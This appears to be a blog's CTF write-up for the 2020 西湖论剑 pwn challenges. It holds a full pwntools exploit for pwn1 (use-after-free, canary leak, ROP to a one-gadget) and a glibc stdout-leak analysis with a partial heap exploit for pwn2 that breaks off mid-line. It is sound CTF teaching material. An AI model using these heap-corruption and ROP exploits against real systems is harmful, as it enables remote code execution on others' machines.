<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Sivona">





<title>2020西湖论剑wp-pwn | Sivona&#39;s</title>



    <link rel="icon" href="/bug.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    




<meta name="generator" content="Hexo 4.2.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Sivona&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Sivona&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">2020西湖论剑wp-pwn</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Sivona</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">October 12, 2020&nbsp;&nbsp;18:22:29</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/writeup/">writeup</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>存在uaf，另外需要在栈上伪造一个chunk头</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">"./mmutag"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./mmutag"</span>)</span><br><span class="line">p = remote(<span class="string">"183.129.189.61"</span>,<span class="number">53104</span>)</span><br><span class="line">elf = ELF(<span class="string">"./mmutag"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choise:\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"content\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choise:\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choise:\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">'bp 0x400AC4'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"name: \n"</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"tag: "</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">info(<span class="string">"stack:"</span> + hex(stack))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice:\n\n"</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'sivona'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,p64(stack<span class="number">-0x38</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">fuck(<span class="string">'a'</span>*<span class="number">0x19</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">0x19</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">info(<span class="string">"canary:"</span> + hex(canary))</span><br><span class="line"></span><br><span class="line">fuck(<span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x7f</span>))</span><br><span class="line">rdi = <span class="number">0x0000000000400d23</span></span><br><span class="line">rsi_r15 = <span class="number">0x0000000000400d21</span></span><br><span class="line">leave = <span class="number">0x400CBA</span></span><br><span class="line">gad1 = <span class="number">0x400D1A</span></span><br><span class="line">gad2 = <span class="number">0x400D00</span></span><br><span class="line">buf = flat(</span><br><span class="line">    canary,<span class="number">0</span>,</span><br><span class="line">    rdi,elf.got[<span class="string">'puts'</span>],elf.plt[<span class="string">'puts'</span>],</span><br><span class="line">    gad1,<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">'read'</span>],<span class="number">0x100</span>,stack+<span class="number">0x78</span>,<span class="number">0</span>,gad2,</span><br><span class="line">        )</span><br><span class="line">add(<span class="number">7</span>,buf)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choise:\n"</span>,<span class="string">'4'</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(p64(libc_base+<span class="number">0xf0364</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>这题死活没做出来，主要是不知道怎么leak（如果当时再仔细一点或者去看一下源码也许就能做出来了，我是个憨憨嘤嘤嘤</p>
<h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>先看一下函数调用链</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">0</span>  __GI___libc_write (fd=<span class="number">1</span>, buf=<span class="number">0x7ffff7dd3708</span> &lt;_IO_2_1_stderr_+<span class="number">136</span>&gt;, nbytes=<span class="number">219</span>) at ../sysdeps/unix/sysv/linux/write.c:<span class="number">27</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007ffff7a9ab1d</span> in _IO_new_file_write (f=<span class="number">0x7ffff7dd3760</span> &lt;_IO_2_1_stdout_&gt;, data=<span class="number">0x7ffff7dd3708</span> &lt;_IO_2_1_stderr_+<span class="number">136</span>&gt;, n=<span class="number">219</span>) at fileops.c:<span class="number">1203</span></span><br><span class="line">#2  0x00007ffff7a99ec1 in new_do_write (fp=0x7ffff7dd3760 &lt;_IO_2_1_stdout_&gt;, data=0x7ffff7dd3708 &lt;_IO_2_1_stderr_+136&gt; "\260H\335\367\377\177", to_do=to_do@entry=219) at fileops.c:457</span><br><span class="line">#<span class="number">3</span>  <span class="number">0x00007ffff7a9bbb9</span> in _IO_new_do_write (fp=&lt;optimized out&gt;, data=&lt;optimized out&gt;, to_do=<span class="number">219</span>) at fileops.c:<span class="number">433</span></span><br><span class="line">#<span class="number">4</span>  <span class="number">0x00007ffff7a9b166</span> in _IO_new_file_xsputn (f=<span class="number">0x7ffff7dd3760</span> &lt;_IO_2_1_stdout_&gt;, data=&lt;optimized out&gt;, n=<span class="number">31</span>) at fileops.c:<span class="number">1266</span></span><br><span class="line">#<span class="number">5</span>  <span class="number">0x00007ffff7a910b3</span> in _IO_puts (str=<span class="number">0x555555555d28</span> <span class="string">"======= Server return: =======\n"</span>) at ioputs.c:<span class="number">40</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里其实就是调用了vtable中的_IO_new_file_xsputn</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br></pre></td></tr></table></figure>
<p>这里省略了一些代码，最终会调用_IO_OVERFLOW，前面在检查缓冲区还有多少空间</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>
<p>一半情况下flags都为0xfbad2887所以前面的if都可以绕过，最终会调用_IO_do_write</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了能绕过else if 有两种方法</p>
<ul>
<li>fp-&gt;_flags &amp; _IO_IS_APPENDING(0x1000) == 1</li>
</ul>
<p>或者</p>
<ul>
<li>fp-&gt;_IO_read_end == fp-&gt;_IO_write_base</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>因为好久没做堆题，exp写的有点烂，看到网上有师傅通过控制tcache_struct来任意地址写，很舒服</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">pdbg = pwn_debug(<span class="string">"./ezhttp"</span>)</span><br><span class="line">pdbg.debug(<span class="string">"2.27"</span>)</span><br><span class="line"></span><br><span class="line">pdbg.context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux','sp','-h']</span></span><br><span class="line">pdbg.context.arch = <span class="string">"AMD64"</span></span><br><span class="line">p = pdbg.run(<span class="string">"debug"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/glibc/x64/2.27/lib/libc-2.27.so"</span>)</span><br><span class="line">token = <span class="string">"\x7f"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    action = <span class="string">"/create"</span></span><br><span class="line">    header = <span class="string">"POST "</span></span><br><span class="line">    header += action</span><br><span class="line">    header += <span class="string">" Cookie: user=admin token: "</span>+token</span><br><span class="line">    header +=<span class="string">" \r\n\r\n"</span></span><br><span class="line">    p.sendafter(<span class="string">"========\n"</span>,header+<span class="string">"content="</span>+content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    action = <span class="string">"/del"</span></span><br><span class="line">    header = <span class="string">"POST "</span></span><br><span class="line">    header += action</span><br><span class="line">    header += <span class="string">" Cookie: user=admin token: "</span>+token</span><br><span class="line">    header +=<span class="string">" \r\n\r\n"</span></span><br><span class="line">    p.sendlineafter(<span class="string">"========\n"</span>,header+<span class="string">"index="</span>+str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    action = <span class="string">"/edit"</span></span><br><span class="line">    header = <span class="string">"POST "</span></span><br><span class="line">    header += action</span><br><span class="line">    header += <span class="string">" Cookie: user=admin token: "</span>+token</span><br><span class="line">    header +=<span class="string">" \r\n\r\n"</span></span><br><span class="line">    p.sendafter(<span class="string">"========\n"</span>,header+<span class="string">"index="</span>+str(index)+<span class="string">"&amp;content="</span>+content+<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(a)</span>:</span></span><br><span class="line">    gdb.attach(p,a)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0xe8</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: "</span>)</span><br><span class="line">heap = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0xd8</span>)</span><br><span class="line">add(<span class="string">"\x11"</span>*<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">"\x22"</span>*<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line"><span class="comment">#add('a'*0xf8)</span></span><br><span class="line">edit(<span class="number">4</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">15</span>)</span><br><span class="line"><span class="comment">#edit(5,(p64(0)+p64(0x21))*15)</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">info(<span class="string">"heap:"</span> + hex(heap))</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(heap<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="string">"\x11"</span>*<span class="number">0xf8</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="string">"\x11"</span>*<span class="number">0xf8</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0xf8</span>)<span class="comment">#8</span></span><br><span class="line">edit(<span class="number">8</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x451</span>)))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0xf8</span>)<span class="comment">#9</span></span><br><span class="line">edit(<span class="number">9</span>,<span class="string">'\x11'</span>*<span class="number">0xe8</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0xe8</span>)<span class="comment">#10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0xf0</span>+<span class="string">'\x70\x37'</span>)<span class="comment">#11</span></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">'a'</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x18</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="string">'\x7f'</span>*<span class="number">0x18</span>)<span class="comment">#13</span></span><br><span class="line">edit(<span class="number">13</span>,p64(heap)*<span class="number">3</span>)</span><br><span class="line">leak = 